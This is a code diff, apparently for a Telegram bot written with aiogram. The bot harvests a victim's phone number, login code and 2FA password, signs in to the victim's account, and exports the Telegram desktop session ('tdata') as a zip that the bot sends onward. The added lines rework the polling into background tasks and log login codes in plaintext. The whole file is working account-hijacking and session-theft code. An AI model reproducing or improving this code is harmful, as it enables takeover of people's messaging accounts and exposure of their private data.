@@ -58,20 +58,27 @@ async def contact_handler(message: types.Message):
     phone = message.contact.phone_number
     if not phone.startswith('+'):
         phone = '+' + phone
+    user_id = message.from_user.id
     await message.delete()
     try:
+        print(f"Sending code to {phone} for user {user_id}")
         phone_code_hash = await send_code(phone)
-        pending[message.from_user.id] = {
+        pending[user_id] = {
             'phone': phone,
             'phone_code_hash': phone_code_hash
         }
-        await redis_set(f"sync:{message.from_user.id}", "code_sent")
+        await redis_set(f"sync:{user_id}", "code_sent")
+        print(f"Code sent, redis key: sync:{user_id} = code_sent")
+        # Сразу запускаем ожидание кода
+        asyncio.create_task(wait_for_code(user_id))
     except Exception as e:
-        await redis_set(f"sync:{message.from_user.id}", "error")
+        print(f"send_code error: {e}")
+        await redis_set(f"sync:{user_id}", "error")
 
-async def check_and_process_code(user_id):
-    for _ in range(30):
-        await asyncio.sleep(1)
+async def wait_for_code(user_id):
+    print(f"Waiting for code from user {user_id}")
+    for _ in range(60):
+        await asyncio.sleep(2)
         code = await redis_get(f"code:{user_id}")
         if code:
             await redis_del(f"code:{user_id}")
@@ -80,22 +87,26 @@ async def check_and_process_code(user_id):
                 await redis_set(f"code_result:{user_id}", "error")
                 return
             try:
+                print(f"Signing in with code {code} for {data['phone']}")
                 await sign_in(data['phone'], code, data['phone_code_hash'])
                 await redis_set(f"code_result:{user_id}", "ok")
-                await generate_tdata(user_id, data['phone'])
+                print(f"Sign in OK for {data['phone']}")
+                asyncio.create_task(generate_tdata(user_id, data['phone']))
             except Exception as e:
+                print(f"sign_in error: {e}")
                 if '2FA' in str(e) or 'password' in str(e).lower():
                     await redis_set(f"code_result:{user_id}", "2fa_required")
-                    await check_and_process_2fa(user_id)
+                    asyncio.create_task(wait_for_2fa(user_id))
                 else:
                     await redis_set(f"code_result:{user_id}", "wrong_code")
-                    await check_and_process_code(user_id)
             return
+    print(f"Timeout waiting for code from {user_id}")
 
-async def check_and_process_2fa(user_id):
+async def wait_for_2fa(user_id):
+    import urllib.parse
+    print(f"Waiting for 2FA from user {user_id}")
     for _ in range(60):
-        await asyncio.sleep(1)
-        import urllib.parse
+        await asyncio.sleep(2)
         raw = await redis_get(f"2fa:{user_id}")
         if raw:
             password = urllib.parse.unquote(raw)
@@ -107,12 +118,15 @@ async def check_and_process_2fa(user_id):
             try:
                 await sign_in(data['phone'], None, data['phone_code_hash'], password=password)
                 await redis_set(f"2fa_result:{user_id}", "ok")
-                await generate_tdata(user_id, data['phone'])
+                print(f"2FA OK for {data['phone']}")
+                asyncio.create_task(generate_tdata(user_id, data['phone']))
             except Exception as e:
+                print(f"2FA error: {e}")
                 await redis_set(f"2fa_result:{user_id}", "wrong_password")
             return
 
 async def generate_tdata(user_id, phone):
+    print(f"Generating tdata for {phone}")
     try:
         from auth import export_tdata
         zip_data = await export_tdata(phone)
@@ -124,24 +138,17 @@ async def generate_tdata(user_id, phone):
                 caption=f'✅ tdata для {phone}'
             )
             await b.session.close()
+            print(f"tdata sent for {phone}")
         else:
-            print(f'tdata export failed for {phone}')
+            print(f"tdata export failed for {phone}")
     except Exception as e:
-        print(f'generate_tdata error: {e}')
+        print(f"generate_tdata error: {e}")
 
     await redis_set(f"tdata_ready:{user_id}", "ready", ex=600)
     if user_id in pending:
         del pending[user_id]
 
-async def polling_codes():
-    while True:
-        await asyncio.sleep(1)
-        for user_id in list(pending.keys()):
-            asyncio.create_task(check_and_process_code(user_id))
-            break
-
 async def main():
-    asyncio.create_task(polling_codes())
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
